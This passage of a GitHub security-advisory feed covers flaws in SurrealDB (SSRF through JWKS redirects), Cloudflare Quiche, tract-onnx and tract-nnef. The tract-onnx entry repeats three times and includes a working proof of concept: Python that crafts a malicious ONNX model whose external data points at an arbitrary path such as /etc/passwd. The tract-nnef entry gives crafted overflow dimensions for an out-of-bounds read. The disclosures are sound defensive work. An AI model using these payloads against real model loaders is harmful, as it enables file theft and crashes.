<li><a href="https://github.com/surrealdb/surrealdb/pull/5600">https://github.com/surrealdb/surrealdb/pull/5600</a></li>
<li>fix(iam): deny filesystem access by default and stop leaking file content in analyzer errors</li>
</ul>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Thanks to Jan Kahmen (<a href="https://github.com/kah-ja">@kah-ja</a>) for finding and reporting this issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-cc8f-fcx3-gpjr">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-cc8f-fcx3-gpjr</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/pull/5600">https://github.com/surrealdb/surrealdb/pull/5600</a></li>
<li><a href="https://github.com/advisories/GHSA-cc8f-fcx3-gpjr">https://github.com/advisories/GHSA-cc8f-fcx3-gpjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc8f-fcx3-gpjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T22:10:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: SSRF via JWKS URL — Redirect Following in JWT Key Fetch]]></title>
        <id>https://github.com/advisories/GHSA-h5rg-8p7f-47g2</id>
        <link href="https://github.com/advisories/GHSA-h5rg-8p7f-47g2"/>
        <updated>2026-06-19T22:10:45.000Z</updated>
        <content type="html"><![CDATA[<p>SurrealDB fetches the JWKS document for a JWT or record access method using a bare <code>reqwest</code> client that follows HTTP redirects by default. The network capability check in <code>core/src/iam/jwks.rs</code> (<code>check_capabilities_url</code>) is applied only to the originally configured URL; redirect targets are not re-validated. An <code>--allow-net</code>-permitted JWKS host that returns a <code>3xx Location</code> can therefore redirect the request to an address the allowlist was meant to block, resulting in a server-side request forgery (SSRF). The protected <code>HttpClient</code> used by <code>http::*</code> functions re-checks every redirect hop and was hardened in 3.1.0, but the JWKS fetcher uses its own client and was not covered.</p>
<h3 id="impact">Impact</h3>
<p>What an attacker <strong>can</strong> do:</p>
<ul>
<li>With the <strong>Owner</strong> role at database level or above (the minimum required to run <code>DEFINE ACCESS ... TYPE JWT URL</code> or <code>TYPE RECORD ... WITH JWT URL</code>), point an access method at an allowlisted host they control and redirect the server's GET to an otherwise-blocked target — cloud metadata, loopback, internal services — bypassing <code>--allow-net</code>/<code>--deny-net</code>.</li>
<li>Infer the existence and liveness of internal hosts and ports from response-timing differences (bounded by the 1-second fetch timeout).</li>
</ul>
<p>What it <strong>can't</strong> do:</p>
<ul>
<li>Read the response: the fetch is blind — the body is only parsed as a JWKS, and a non-JWKS response surfaces as an opaque <code>InvalidAuth</code> error. Nothing is returned to the caller.</li>
<li>Modify data or affect availability (a single GET request).</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The JWKS fetcher now applies a redirect policy that re-validates every redirect target against the configured network capabilities (mirroring <code>check_capabilities_url</code>) and caps redirects at <code>max_http_redirects</code>.</p>
<ul>
<li>Versions prior to 3.1.5 are vulnerable.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Restrict the Owner role to trusted operators.</li>
<li>Enforce egress filtering at the network layer (block link-local <code>169.254.0.0/16</code> and internal ranges) so redirect targets are unreachable regardless of in-process checks.</li>
<li>Configure access methods to use only trusted JWKS hosts that do not redirect, or use locally defined keys instead of a remote JWKS.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://surrealdb.com/docs/surrealdb/security/capabilities">SurrealDB Documentation — Capabilities</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/access">SurrealQL Documentation — DEFINE ACCESS</a></li>
<li><code>fix(iam): prevent SSRF in JWKS fetch by re-validating redirect targets</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-h5rg-8p7f-47g2">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-h5rg-8p7f-47g2</a></li>
<li><a href="https://github.com/advisories/GHSA-h5rg-8p7f-47g2">https://github.com/advisories/GHSA-h5rg-8p7f-47g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5rg-8p7f-47g2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quiche] Cloudflare Quiche: Use-after-free in connection ID iterator FFI functions]]></title>
        <id>https://github.com/advisories/GHSA-mh64-ph39-mrc9</id>
        <link href="https://github.com/advisories/GHSA-mh64-ph39-mrc9"/>
        <updated>2026-06-19T22:10:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cloudflare Quiche was affected by 2 use-after-free vulnerabilities in the connection ID iterator FFI functions.</p>
<p>The <code>quiche_connection_id_iter_next</code> and <code>quiche_conn_retired_scid_next</code> functions would return a pointer to a <code>ConnectionId</code> to the applications via function arguments, but the the owned <code>ConnectionId</code> would be dropped at the end of those functions' scope.</p>
<p>Only applications using those FFI functions are affected. The FFI API is disabled by default by a build-time feature flag.</p>
<p>quiche 0.29.2 is the earliest version containing the fix for this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/quiche/security/advisories/GHSA-mh64-ph39-mrc9">https://github.com/cloudflare/quiche/security/advisories/GHSA-mh64-ph39-mrc9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11941">https://nvd.nist.gov/vuln/detail/CVE-2026-11941</a></li>
<li><a href="https://github.com/advisories/GHSA-mh64-ph39-mrc9">https://github.com/advisories/GHSA-mh64-ph39-mrc9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh64-ph39-mrc9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
        <updated>2026-06-19T14:45:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
<h3 id="details">Details</h3>
<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
</code></pre>
<ul>
<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
</ul>
<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
<ol>
<li>A canary file the model must not be able to read:
<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
</ol>
<pre><code class="language-python">import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
</code></pre>
<ol start="3">
<li>Victim loads the untrusted model with the standard API:</li>
</ol>
<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&amp;bytes));
</code></pre>
<p>Output:</p>
<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
</code></pre>
<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
<h3 id="impact">Impact</h3>
<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T14:45:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
